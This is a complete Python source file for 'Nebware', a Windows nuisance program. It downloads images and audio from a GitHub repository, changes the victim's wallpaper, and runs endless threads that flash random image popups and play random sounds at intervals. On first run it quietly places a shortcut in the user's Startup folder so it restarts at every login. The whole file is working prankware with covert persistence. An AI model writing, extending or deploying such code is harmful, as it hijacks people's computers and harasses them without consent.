import ctypes
import os
# import platform
import random
import threading
import time
from tkinter import Tk, Label
import pygame
import requests
from PIL import Image, ImageTk
import shutil
import sys
import win32com.client

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
MARKER_FILE = os.path.join(os.getenv('LOCALAPPDATA'), 'Nebware', 'first_run_marker.txt')


def download_file(url, local_path):
    response = requests.get(url)

    if response.status_code == 200:
        with open(local_path, 'wb') as file:
            file.write(response.content)
        print(f"Downloaded {url} to {local_path}")
    else:
        print(f"Failed to download {url}. Status code: {response.status_code}")


def download_resources():
    popup_urls = [
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/image1.jpeg',
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/image2.jpg',
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/image3.jpg',
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/image4.jpg',
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/image5.jpeg',
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/image6.PNG',
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/image7.jpg',
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/image8.jpg'
    ]
    audio_urls = {
        'https://github.com/NebbyOW/Nebware/raw/main/Nebware/audio1.mp3',
        'https://github.com/NebbyOW/Nebware/raw/main/Nebware/audio2.mp3',
        'https://github.com/NebbyOW/Nebware/raw/main/Nebware/audio3.mp3'
    }
    wallpaper_urls = [
        'https://raw.githubusercontent.com/NebbyOW/Nebware/main/Nebware/wallpaper1.png'
    ]

    # Create Temp Directories
    os.makedirs(r'c:/ProgramData/Nebware/temp/789654213', exist_ok=True)
    os.makedirs(r'c:/ProgramData/Nebware/temp/6548312156', exist_ok=True)
    os.makedirs(r'c:/ProgramData/Nebware/temp/10245879', exist_ok=True)

    popup_files = []
    audio_files = []
    wallpaper_files = []

    for url in popup_urls:
        local_path = os.path.join(r'c:/ProgramData/Nebware/temp/789654213', os.path.basename(url))
        download_file(url, local_path)
        popup_files.append(local_path)

    for url in audio_urls:
        local_path = os.path.join(r'c:/ProgramData/Nebware/temp/6548312156', os.path.basename(url))
        download_file(url, local_path)
        audio_files.append(local_path)

    for url in wallpaper_urls:
        local_path = os.path.join(r'c:/ProgramData/Nebware/temp/10245879', os.path.basename(url))
        download_file(url, local_path)
        wallpaper_files.append(local_path)

    for path in wallpaper_files:
        validate_image(path)
    for path in popup_files:
        validate_image(path)

    return popup_files, audio_files, wallpaper_files


def validate_image(image_path):
    try:
        with Image.open(image_path) as img:
            img.verify()
        print(f"{image_path} is a valid image.")
    except(IOError, SyntaxError) as e:
        print(f"{image_path} is not a valid image. Error: {e}")


def change_wallpaper(image_path):
    image_path = os.path.abspath(image_path)
    image_path = image_path.replace('/', '\\')  # Double backslashes for Windows paths

    if not os.path.isfile(image_path):
        print(f"File {image_path} does not exist.")
        return

        # Call SystemParametersInfo to set wallpaper
    try:
        result = ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        if result:
            print("Wallpaper set successfully.")
        else:
            print("Failed to set wallpaper.")
    except Exception as e:
        print(f"An error occurred: {e}")


def create_startup_shortcut():
    # Determine the path to the startup folder
    if os.getenv('USERPROFILE'):
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    else:
        startup_folder = os.path.join(os.getenv('PROGRAMDATA'), r'Microsoft\Windows\Start Menu\Programs\StartUp')

    # Path to your executable
    exe_path = os.path.abspath(sys.argv[0])

    # Shortcut name
    shortcut_name = 'YourAppName.lnk'
    shortcut_path = os.path.join(startup_folder, shortcut_name)

    # Create a shortcut
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = exe_path
    shortcut.WorkingDirectory = os.path.dirname(exe_path)
    shortcut.IconLocation = exe_path
    shortcut.save()


def is_first_run():
    # Check if the marker file exists
    return not os.path.isfile(MARKER_FILE)


def mark_as_run():
    # Create a directory for marker file if it doesn't exist
    os.makedirs(os.path.dirname(MARKER_FILE), exist_ok=True)
    # Create the marker file
    with open(MARKER_FILE, 'w') as f:
        f.write('This file indicates the app has run.')


def play_random_audio(audio_files):
    pygame.mixer.init()
    while True:
        audio_file = random.choice(audio_files)
        pygame.mixer.music.load(audio_file)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            time.sleep(1)
        time.sleep(random.randint(30, 120))


def show_popup(image_path):
    root = Tk()
    img = Image.open(image_path)
    img = ImageTk.PhotoImage(img)
    panel = Label(root, image=img)
    panel.pack(side="bottom", fill="both", expand="yes")
    root.after(5000, lambda: root.destroy())  # close after 5 seconds
    root.mainloop()


def random_popups(popup_files):
    while True:
        image_file = random.choice(popup_files)
        show_popup(image_file)
        time.sleep(random.randint(30, 120))


def main():
    popup_files, audio_files, wallpaper_files = download_resources()

    wallpaper_image_path = 'C:/ProgramData/Nebware/temp/10245879/wallpaper1.png'
    change_wallpaper(wallpaper_image_path)

    # Start the wall paper change, audio player, and popup gen
    threading.Thread(target=random_popups, args=(popup_files,)).start()
    threading.Thread(target=play_random_audio, args=(audio_files,)).start()

    if is_first_run():
        create_startup_shortcut()
        mark_as_run()


if __name__ == '__main__':
    main()

# Press the green button in the gutter to run the script.


# See PyCharm help at https://www.jetbrains.com/help/pycharm/
